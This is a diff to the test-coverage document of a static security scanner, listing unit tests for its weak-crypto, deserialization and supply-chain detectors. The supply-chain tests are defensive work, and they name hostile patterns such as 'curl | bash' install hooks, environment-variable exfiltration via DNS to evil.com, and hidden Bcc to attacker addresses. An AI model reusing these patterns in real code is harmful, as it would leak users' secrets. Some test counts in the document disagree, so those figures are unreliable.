@@ -1,6 +1,6 @@
-# MCP Sentinel v0.2.0 — Test Coverage
+# MCP Sentinel v0.4.0 — Test Coverage
 
-**Total: 334 passed, 4 xfailed (documented), 0 failed**
+**Total: 525 passed, 4 xfailed (documented), 0 failed**
 **Python:** 3.9, 3.10, 3.11, 3.12
 **Last run:** 2026-03-23
 
@@ -10,6 +10,9 @@
 
 | Test File | Tests | Status | What It Covers |
 |---|---|---|---|
+| `tests/unit/test_insecure_deserialization.py` | 54 | 54 pass | InsecureDeserializationDetector — new in v0.4.0 |
+| `tests/unit/test_weak_crypto.py` | 60 | 60 pass | WeakCryptoDetector — new in v0.4.0 |
+| `tests/unit/test_supply_chain.py` | 75 | 75 pass | SupplyChainDetector — new in v0.3.0 |
 | `tests/unit/test_ssrf_detector.py` | 25 | 25 pass | SSRFDetector — new in v0.2.0 |
 | `tests/unit/test_network_binding.py` | 22 | 22 pass | NetworkBindingDetector — new in v0.2.0 |
 | `tests/unit/test_missing_auth.py` | 19 | 19 pass | MissingAuthDetector — new in v0.2.0 |
@@ -28,6 +31,219 @@
 | `tests/unit/core/test_config.py` | 5 | 5 pass | Configuration/settings |
 | `tests/integration/test_scanner.py` | 7 | 7 pass | End-to-end scan pipeline |
 | `tests/test_caching.py` | 1 | 1 pass | MD5-based file cache |
+
+---
+
+## v0.4.0 New Detector Tests
+
+### WeakCryptoDetector (48 tests)
+
+| Test | What It Verifies |
+|---|---|
+| `test_detector_name` | `detector.name == "WeakCryptoDetector"` |
+| `test_detector_enabled_by_default` | `detector.enabled is True` |
+| `test_applicable_python` | `.py` in scope |
+| `test_applicable_javascript` | `.js` in scope |
+| `test_applicable_typescript` | `.ts` in scope |
+| `test_applicable_java` | `.java` in scope |
+| `test_applicable_go` | `.go` in scope |
+| `test_not_applicable_yaml` | `.yaml` excluded |
+| `test_not_applicable_markdown` | `.md` excluded |
+| `test_not_applicable_json` | `.json` excluded |
+| `test_detect_hashlib_md5` | `hashlib.md5()` → HIGH |
+| `test_detect_hashlib_sha1` | `hashlib.sha1()` → HIGH |
+| `test_detect_crypto_create_hash_md5` | `crypto.createHash('md5')` → HIGH |
+| `test_detect_crypto_create_hash_sha1` | `crypto.createHash('sha1')` → HIGH |
+| `test_detect_java_message_digest_md5` | `MessageDigest.getInstance("MD5")` → HIGH |
+| `test_detect_java_message_digest_sha1` | `MessageDigest.getInstance("SHA-1")` → HIGH |
+| `test_broken_hash_severity_is_high` | broken_hash severity == "high" |
+| `test_no_false_positive_md5_for_checksum` | `checksum = hashlib.md5(data).hexdigest()` suppressed |
+| `test_no_false_positive_md5_for_etag` | `etag = hashlib.md5(content).hexdigest()` suppressed |
+| `test_detect_random_random` | `random.random()` → HIGH |
+| `test_detect_random_randint` | `random.randint(...)` → HIGH |
+| `test_detect_random_choice_token` | `random.choice(...)` for tokens → HIGH |
+| `test_detect_math_random_js` | `Math.random()` → HIGH |
+| `test_insecure_random_severity_is_high` | insecure_random severity == "high" |
+| `test_no_false_positive_import_random` | `import random` alone not flagged |
+| `test_detect_aes_mode_ecb` | `AES.new(key, AES.MODE_ECB)` → HIGH |
+| `test_detect_mode_ecb_constant` | `Cipher.getInstance("AES/ECB/PKCS5Padding")` → HIGH |
+| `test_detect_createcipheriv_ecb` | `createCipheriv("aes-128-ecb", ...)` → HIGH |
+| `test_ecb_severity_is_high` | ecb_mode severity == "high" |
+| `test_detect_des_new` | `DES.new(key)` → HIGH |
+| `test_detect_rc4` | `ARC4.new(key)` → HIGH |
+| `test_detect_java_des` | `Cipher.getInstance("DES/...")` → HIGH |
+| `test_detect_createcipheriv_rc4` | `createCipheriv("rc4", ...)` → HIGH |
+| `test_deprecated_cipher_severity_is_high` | deprecated_cipher severity == "high" |
+| `test_detect_static_iv_zeros` | `iv = b'\x00' * 16` → HIGH |
+| `test_detect_hardcoded_iv_hex_string` | `nonce = bytes.fromhex("0000000000000000")` → HIGH |
+| `test_detect_pbkdf2_low_iterations` | `pbkdf2_hmac(..., iterations=1000)` → MEDIUM |
+| `test_weak_kdf_severity_is_medium` | weak_kdf severity == "medium" |
+| `test_no_false_positive_comment_line` | Commented-out hash calls not flagged |
+| `test_no_false_positive_test_word` | Lines with `test` suppressed |
+| `test_empty_file` | Empty file produces no findings |
+| `test_vulnerability_has_cwe` | All findings have a `cwe_id` |
+| `test_vulnerability_has_remediation` | All findings have non-empty `remediation` |
+| `test_vulnerability_has_references` | All findings have references |
+| `test_vulnerability_detector_field` | `v.detector == "WeakCryptoDetector"` |
+| `test_vulnerability_engine_field` | `v.engine == "static"` |
+| `test_line_number_accuracy` | Line number points to the flagged line |
+| `test_code_snippet_captured` | Code snippet contains the matched expression |
+| `test_detect_random_randrange` | `random.randrange(...)` → HIGH |
+| `test_detect_random_uniform` | `random.uniform(...)` → HIGH |
+| `test_detect_random_choices` | `random.choices(...)` for passwords → HIGH |
+| `test_detect_random_sample` | `random.sample(...)` → HIGH |
+| `test_detect_blowfish_new` | `Blowfish.new(key, ...)` → HIGH |
+| `test_detect_des3_new` | `DES3.new(key, ...)` → HIGH |
+| `test_detect_createcipheriv_des` | `createCipheriv('des', ...)` → HIGH |
+| `test_detect_createcipheriv_blowfish` | `createCipheriv('bf-cbc', ...)` → HIGH |
+| `test_detect_bcrypt_low_rounds` | `bcrypt.hashpw(..., rounds=4)` → MEDIUM |
+| `test_multiple_weaknesses_same_file` | MD5 + insecure random + ECB all found in one file |
+| `test_not_applicable_php` | `.php` files excluded |
+| `test_not_applicable_ruby` | `.rb` files excluded |
+
+### InsecureDeserializationDetector (54 tests)
+
+| Test | What It Verifies |
+|---|---|
+| `test_detector_name` | `detector.name == "InsecureDeserializationDetector"` |
+| `test_detector_enabled_by_default` | `detector.enabled is True` |
+| `test_applicable_python` | `.py` in scope |
+| `test_applicable_javascript` | `.js` in scope |
+| `test_applicable_typescript` | `.ts` in scope |
+| `test_applicable_java` | `.java` in scope |
+| `test_applicable_php` | `.php` in scope |
+| `test_not_applicable_go` | `.go` excluded |
+| `test_not_applicable_yaml` | `.yaml` excluded |
+| `test_not_applicable_markdown` | `.md` excluded |
+| `test_detect_pickle_loads` | `pickle.loads(data)` → CRITICAL |
+| `test_detect_pickle_load_file` | `pickle.load(f)` → CRITICAL |
+| `test_detect_cpickle_loads` | `cPickle.loads(data)` → CRITICAL |
+| `test_pickle_line_number_accuracy` | Line number points to the `pickle.loads` line |
+| `test_pickle_code_snippet_captured` | Code snippet contains `pickle` |
+| `test_detect_yaml_load_no_loader` | `yaml.load(data)` with no Loader → CRITICAL |
+| `test_detect_yaml_load_full_loader` | `yaml.load(data, Loader=yaml.FullLoader)` → CRITICAL |
+| `test_no_false_positive_yaml_safe_load_function` | `yaml.safe_load(data)` not flagged |
+| `test_no_false_positive_yaml_safeloader_arg` | `yaml.load(data, Loader=yaml.SafeLoader)` not flagged |
+| `test_detect_marshal_loads` | `marshal.loads(data)` → CRITICAL |
+| `test_detect_marshal_load` | `marshal.load(f)` → CRITICAL |
+| `test_detect_eval_on_request_data` | `eval(request.body)` → CRITICAL |
+| `test_detect_eval_on_body` | `eval(data)` → CRITICAL |
+| `test_no_false_positive_eval_string_literal` | `eval("1 + 1")` not flagged |
+| `test_detect_jsonpickle_decode` | `jsonpickle.decode(data)` → CRITICAL |
+| `test_detect_java_object_input_stream` | `new ObjectInputStream(...)` → CRITICAL |
+| `test_detect_java_read_object` | `.readObject()` → CRITICAL |
+| `test_detect_xstream` | `new XStream()` → CRITICAL |
+| `test_java_object_stream_not_flagged_in_python` | Java patterns don't fire on `.py` files |
+| `test_detect_php_unserialize` | `unserialize($_POST[...])` → CRITICAL |
+| `test_php_unserialize_not_flagged_in_python` | PHP patterns don't fire on `.py` files |
+| `test_detect_vm_run_in_context` | `vm.runInContext(code, ctx)` → CRITICAL |
+| `test_detect_vm_run_in_new_context` | `vm.runInNewContext(code, sandbox)` → CRITICAL |
+| `test_detect_node_eval_body` | `eval(req.body)` in Node.js → CRITICAL |
+| `test_no_false_positive_comment` | Commented-out deserialization calls not flagged |
+| `test_no_false_positive_test_context` | Lines with standalone `test` suppressed |
+| `test_empty_file` | Empty file produces no findings |
+| `test_shelve_hardcoded_path_suppressed` | `shelve.open("fixed_path.db")` not flagged |
+| `test_vulnerability_type_is_insecure_deserialization` | `v.vuln_type == VulnerabilityType.INSECURE_DESERIALIZATION` |
+| `test_vulnerability_has_cwe` | All findings have a `cwe_id` |
+| `test_vulnerability_has_remediation` | All findings have non-empty `remediation` |
+| `test_vulnerability_has_references` | All findings have references |
+| `test_vulnerability_has_mitre_attack` | All findings have `mitre_attack_ids` |
+| `test_vulnerability_detector_field` | `v.detector == "InsecureDeserializationDetector"` |
+| `test_vulnerability_engine_field` | `v.engine == "static"` |
+| `test_detect_pickle_unpickler` | `pickle.Unpickler(f).load()` → CRITICAL |
+| `test_detect_underscore_pickle_loads` | `_pickle.loads(data)` → CRITICAL |
+| `test_detect_shelve_user_controlled_path` | `shelve.open(user_db_path)` variable path → HIGH |
+| `test_detect_jsonpickle_unpickler_decode` | `jsonpickle.unpickler.decode(payload)` → CRITICAL |
+| `test_detect_vm_run_in_this_context` | `vm.runInThisContext(userCode)` → CRITICAL |
+| `test_detect_java_object_input_stream_variable` | `ObjectInputStream ois = new ObjectInputStream(...)` → CRITICAL |
+| `test_multiple_deser_same_file` | pickle + yaml.load + marshal all detected in one file |
+| `test_not_applicable_ruby` | `.rb` files excluded |
+| `test_not_applicable_shell` | `.sh` files excluded |
+
+---
+
+## v0.3.0 New Detector Tests
+
+### SupplyChainDetector (75 tests)
+
+| Test | What It Verifies |
+|---|---|
+| `test_detector_name` | `detector.name == "SupplyChainDetector"` |
+| `test_detector_enabled_by_default` | `detector.enabled is True` |
+| `test_applicable_to_python` | `.py` in scope |
+| `test_applicable_to_javascript` | `.js` in scope |
+| `test_applicable_to_typescript` | `.ts` in scope |
+| `test_applicable_to_shell` | `.sh` in scope |
+| `test_applicable_to_setup_py` | `setup.py` always in scope |
+| `test_applicable_to_package_json` | `package.json` always in scope |
+| `test_applicable_to_requirements_txt` | `requirements.txt` always in scope |
+| `test_applicable_to_pyproject_toml` | `pyproject.toml` always in scope |
+| `test_applicable_to_npmrc` | `.npmrc` always in scope |
+| `test_not_applicable_to_markdown` | `.md` excluded |
+| `test_not_applicable_to_image` | `.png` excluded |
+| `test_detect_eval_base64_python` | `eval(base64.b64decode(...))` → CRITICAL |
+| `test_detect_exec_base64_python` | `exec(base64.b64decode(...))` → CRITICAL |
+| `test_detect_eval_atob_javascript` | `eval(atob(...))` → CRITICAL |
+| `test_detect_eval_buffer_base64` | `eval(Buffer.from(data,'base64').toString(...))` → CRITICAL |
+| `test_detect_zlib_decompress_base64` | `exec(zlib.decompress(base64.b64decode(...)))` → CRITICAL |
+| `test_encoded_payload_line_number_accuracy` | Line number points to the `eval(...)` line |
+| `test_encoded_payload_code_snippet_captured` | Code snippet contains `base64` |
+| `test_detect_setup_py_cmdclass` | `cmdclass={'install': CustomInstall}` with shell call in setup.py → HIGH |
+| `test_detect_npm_postinstall_hook` | `"postinstall": "curl ... \| bash"` in package.json → HIGH |
+| `test_detect_subprocess_curl_in_setup` | `subprocess.call(['curl', ...])` in setup.py → HIGH |
+| `test_no_false_positive_npm_build_hook` | `"postinstall": "node ./scripts/build.js"` not flagged |
+| `test_detect_requests_in_setup_py` | `requests.post(...)` inside setup.py → CRITICAL |
+| `test_detect_urllib_in_setup_py` | `urllib.request.urlopen(...)` inside setup.py → CRITICAL |
+| `test_no_network_call_outside_setup_py` | `requests.get(...)` in server.py not flagged as install-time |
+| `test_detect_requests_post_with_os_environ` | `requests.post(..., data=os.environ)` → CRITICAL |
+| `test_detect_fetch_with_process_env` | `fetch('...', {body: JSON.stringify(process.env)})` → CRITICAL |
+| `test_detect_dns_exfiltration` | `socket.gethostbyname(b64encode(os.environ[...]) + '.evil.com')` → CRITICAL |
+| `test_exfiltration_remediation_contains_rotate` | Remediation text advises rotating credentials |
+| `test_detect_bcc_hardcoded_python` | `msg["Bcc"] = "attacker@evil.com"` → HIGH |
+| `test_detect_bcc_in_dict_assignment` | `{'bcc': 'spy@attacker.com', ...}` → HIGH |
+| `test_detect_forward_to_hardcoded` | `forward_to = 'data-collector@evil.com'` → HIGH |
+| `test_no_false_positive_bcc_comment` | `# BCC: ...` comment not flagged |
+| `test_detect_extra_index_url_unknown` | `--extra-index-url https://packages.internal-corp.example/` → MEDIUM |
+| `test_detect_npm_registry_override` | `registry=https://npm.internal.attacker.com/` in .npmrc → MEDIUM |
+| `test_no_false_positive_official_pypi` | `--index-url https://pypi.org/simple/` not flagged |
+| `test_no_false_positive_official_npm_registry` | `registry=https://registry.npmjs.org/` not flagged |
+| `test_detect_colourama_typosquat` | `import colourama` → HIGH |
+| `test_detect_crossenv_typosquat` | `require("crossenv")` → HIGH |
+| `test_typosquat_references_not_empty` | Typosquat findings include reference URLs |
+| `test_no_false_positive_test_file` | Lines containing `test` are suppressed |
+| `test_no_false_positive_example_comment` | Comment lines not flagged |
+| `test_vulnerability_has_cwe` | All findings have a `cwe_id` |
+| `test_vulnerability_has_mitre_attack` | All findings have `mitre_attack_ids` |
+| `test_vulnerability_has_remediation` | All findings have non-empty `remediation` |
+| `test_vulnerability_detector_field` | `v.detector == "SupplyChainDetector"` |
+| `test_vulnerability_engine_field` | `v.engine == "static"` |
+| `test_detect_urlsafe_b64decode` | `eval(base64.urlsafe_b64decode(...))` → CRITICAL |
+| `test_detect_codecs_decode` | `eval(codecs.decode(..., 'base64'))` → CRITICAL |
+| `test_detect_marshal_loads_base64` | `marshal.loads(base64.b64decode(...))` → CRITICAL |
+| `test_detect_exec_compile_base64` | `exec(compile(base64.b64decode(...), ...))` → CRITICAL |
+| `test_detect_bcc_add_header` | `msg.add_header('Bcc', 'spy@...')` → HIGH |
+| `test_detect_npm_preinstall_hook` | `"preinstall": "curl ... \| bash"` → HIGH |
+| `test_detect_index_url_config_override` | `index-url = https://my.private-registry.io/` in pip.conf → MEDIUM |
+| `test_detect_npm_registry_json_field` | `"registry": "https://npm.attacker-corp.io/"` → MEDIUM |
+| `test_detect_fetch_with_readfile` | `fetch(url, {body: fs.readFileSync(...)})` → CRITICAL |
+| `test_detect_urllib_in_setup_py` | `urllib.request.urlopen(...)` in setup.py → CRITICAL |
+| `test_no_false_positive_base64_decode_without_eval` | `base64.b64decode(...)` alone not flagged |
+| `test_no_false_positive_pypi_index_url` | `--index-url https://pypi.org/simple/` not flagged |
+| `test_no_false_positive_pythonhosted` | `--extra-index-url https://files.pythonhosted.org/` not flagged |
+| `test_encoded_payload_severity_is_critical` | Encoded payload severity == CRITICAL |
+| `test_install_script_network_severity_is_critical` | Network call in setup.py == CRITICAL |
+| `test_covert_exfiltration_severity_is_critical` | Exfiltration severity == CRITICAL |
+| `test_typosquat_mongose` | `require("mongose")` → HIGH |
+| `test_typosquat_reqests` | `import reqests` → HIGH |
+| `test_multiple_categories_same_file` | Multiple categories detected in one file |
+| `test_empty_file` | Empty file produces no findings |
+| `test_blank_lines_only` | Blank-only content produces no findings |
+| `test_comment_only_file` | Comment-only content produces no findings |
+| `test_applicable_to_bash_extension` | `.bash` in scope |
+| `test_applicable_to_jsx` | `.jsx` in scope |
+| `test_applicable_to_tsx` | `.tsx` in scope |
+| `test_applicable_to_setup_cfg` | `setup.cfg` in scope |
+| `test_applicable_to_pipfile` | `Pipfile` in scope |
 
 ---
 
@@ -234,7 +450,14 @@ python -m pytest tests/ -v
 # Specific detector
 python -m pytest tests/unit/test_ssrf_detector.py -v
 
-# v0.2.0 new detectors only
+# v0.4.0 new detectors (93 tests)
+python -m pytest tests/unit/test_weak_crypto.py \
+                 tests/unit/test_insecure_deserialization.py -v
+
+# v0.3.0 new detector (75 tests)
+python -m pytest tests/unit/test_supply_chain.py -v
+
+# v0.2.0 new detectors
 python -m pytest tests/unit/test_ssrf_detector.py \
                  tests/unit/test_network_binding.py \
                  tests/unit/test_missing_auth.py \
